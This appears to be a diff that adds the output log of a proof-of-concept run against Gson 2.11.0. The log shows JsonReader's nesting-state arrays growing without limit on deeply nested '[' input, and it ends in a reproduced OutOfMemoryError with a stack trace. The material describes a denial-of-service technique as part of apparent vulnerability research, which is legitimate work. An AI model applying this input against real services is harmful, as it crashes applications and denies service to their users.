@@ -1,0 +1,33 @@
+ [proguard] ProGuard, version 7.4.2
+built /tmp/tmpjy4p2tu9/poc/../out/src/gson/target/gson-2.11.0.jar sha256 8cabe31a1a6448b346f0dd2c536fee9578be117a9c2c995902bd43d931439385
+mode: baseline
+artifact: gson jar built from repo @ 828a97b (gson-parent-2.11.0)
+input: streamed '[' characters (O(1) reader memory); heap growth is parser state only
+depth=1,000,000  maxStackSize=1,000,000  timeMs=35  heapUsedKB(approx)=16,377
+        after close, heapUsedKB(approx)=16,579
+depth=2,000,000  maxStackSize=2,000,000  timeMs=52  heapUsedKB(approx)=28,579
+        after close, heapUsedKB(approx)=991
+depth=4,000,000  maxStackSize=4,000,000  timeMs=93  heapUsedKB(approx)=53,155
+        after close, heapUsedKB(approx)=1,011
+effect: JsonReader state arrays (stack, pathIndices, pathNames) grow linearly
+        with attacker-chosen nesting depth via push(); no depth is refused.
+effect: now driving the same parse on a bounded heap until the outcome occurs:
+oom-phase: parsing unbounded nested arrays on a -Xmx64m heap
+oom-phase: depth 500000 reached, parser has not refused
+oom-phase: depth 1000000 reached, parser has not refused
+oom-phase: depth 1500000 reached, parser has not refused
+oom-phase: depth 2000000 reached, parser has not refused
+oom-phase: java.lang.OutOfMemoryError: Java heap space at depth ~2097151
+java.lang.OutOfMemoryError: Java heap space
+	at java.base/java.util.Arrays.copyOf(Arrays.java:3793)
+	at com.google.gson.stream.JsonReader.push(JsonReader.java:1415)
+	at com.google.gson.stream.JsonReader.beginArray(JsonReader.java:426)
+	at repro.Repro.oomPhase(Repro.java:94)
+	at repro.Repro.main(Repro.java:183)
+oom-phase: heap exhausted by JsonReader nesting state; no depth limit stopped the parse
+oom-phase: child JVM exit code 2
+oom-phase: OutOfMemoryError observed in bounded-heap child: true
+oom-phase: allocation failure inside com.google.gson.stream.JsonReader.push: true
+oom-phase: heap exhaustion outcome REPRODUCED
+effect: heap exhaustion reproduced: deep JSON nests until JsonReader.push()
+        cannot allocate, terminating the process with OutOfMemoryError.
